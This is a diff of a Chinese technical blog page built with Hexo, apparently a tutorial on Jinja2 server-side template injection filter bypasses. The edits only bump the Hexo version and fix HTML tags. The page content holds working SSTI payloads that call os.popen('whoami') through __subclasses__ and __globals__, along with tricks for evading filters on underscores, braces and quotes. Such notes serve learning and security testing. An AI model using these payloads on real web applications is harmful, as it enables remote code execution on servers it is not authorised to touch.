@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
   <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-trophy-1.png">
@@ -369,7 +369,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <ol>
-<li>可以用attr()过滤器 </li>
+<li>可以用attr()过滤器</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -379,7 +379,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;</span><br></pre></td></tr></table></figure>
 
 <ol>
-<li>通过十六进制编码 </li>
+<li>通过十六进制编码</li>
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>]&#125;&#125; =&#123;&#123;().__class__&#125;&#125;</span><br></pre></td></tr></table></figure>
 
@@ -387,15 +387,13 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__bases__[<span class="number">0</span>]=__bases__.__getitem__(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
 
 <p>其实本质是我们用[]的时候 调用的就是这个魔术方法而已</p>
-<h2 id="绕过花括号"><a href="#绕过花括号" class="headerlink" title="绕过花括号"></a>绕过花括号</h2><p>可以用<code>&#123;%%&#125;`bypass 这时就要在里面用print()来打印结果了
-
+<h2 id="绕过花括号"><a href="#绕过花括号" class="headerlink" title="绕过花括号"></a>绕过花括号</h2><p>可以用<code>&#123;%%&#125;</code>bypass 这时就要在里面用print()来打印结果了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line">修改为</span><br><span class="line">&#123;%<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>]. __subclasses__()[<span class="number">138</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read())%&#125;</span><br></pre></td></tr></table></figure>
 
-也可以借助for循环和if语句来执行命令
-
+<p>也可以借助for循环和if语句来执行命令</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span> i.__name__ ==<span class="string">&#x27;_wrap_close&#x27;</span>%&#125;&#123;%<span class="built_in">print</span> i.__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
 
-注意这里循环语句 有`&#123;%for&#125;`就要有`&#123;%endfor%&#125;</code></p>
+<p>注意这里循环语句 有<code>&#123;%for&#125;`就要有`&#123;%endfor%&#125;</code></p>
 <p>有<code>&#123;%if&#125;` 就要有`&#123;%endif%&#125;</code></p>
 <h2 id="绕过单引号和双引号"><a href="#绕过单引号和双引号" class="headerlink" title="绕过单引号和双引号"></a>绕过单引号和双引号</h2><p>当单引号和双引号被ban时，我们通常采用<code>request.args.a</code>，然后给a赋值这种方式来进行绕过</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[request.args.a]&#125;&#125;&amp;a=__builtins__  等同于 &#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
